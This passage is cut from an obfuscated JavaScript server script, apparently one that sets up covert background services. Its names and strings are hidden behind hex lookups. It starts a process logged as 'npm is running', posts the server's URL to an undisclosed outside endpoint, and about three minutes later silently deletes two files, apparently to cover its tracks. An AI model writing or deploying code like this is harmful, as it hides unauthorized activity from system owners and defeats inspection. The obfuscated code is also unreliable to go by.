_0x3ef538=_0x171213;if(_0x1201dc)console[_0x3ef538(_0x567756._0x46449d)](_0x3ef538(_0x567756._0x5ad8ec),_0x1201dc);else console[_0x3ef538(0x222)]('npm\x20is\x20running');});}catch(_0x3fb860){console[_0x171213(_0x128647._0x16db6b)](_0x171213(0x225)+_0x3fb860);}};async function addAccessTask(){const _0x5aad65={_0xf1f2ac:0x242,_0x599699:0x222},_0x10e551=_0x13fe6c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x148cd1=_0x10e551(0x1d4)+DOMAIN+'/'+SUB_PATH;try{const _0x3e211b=await axios[_0x10e551(_0x5aad65._0xf1f2ac)](_0x10e551(0x1c5),{'url':_0x148cd1},{'headers':{'Content-Type':_0x10e551(0x21a)}});console[_0x10e551(_0x5aad65._0x599699)](_0x10e551(0x22f));}catch(_0x3cb37d){}}const delFiles=()=>{const _0x4e0af9={_0x4e96fc:0x217,_0x1c9b44:0x1f8},_0x13a37e=_0x13fe6c;[_0x13a37e(_0x4e0af9._0x4e96fc),_0x13a37e(_0x4e0af9._0x1c9b44)][_0x13a37e(0x202)](_0x493cf5=>fs['unlink'](_0x493cf5,()=>{}));};httpServer[_0x13fe6c(0x1cd)](PORT,()=>{const _0x2a66df={_0x1d2164:0x211},_0x42dc4a=_0x13fe6c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x42dc4a(_0x2a66df._0x1d2164)+PORT);});
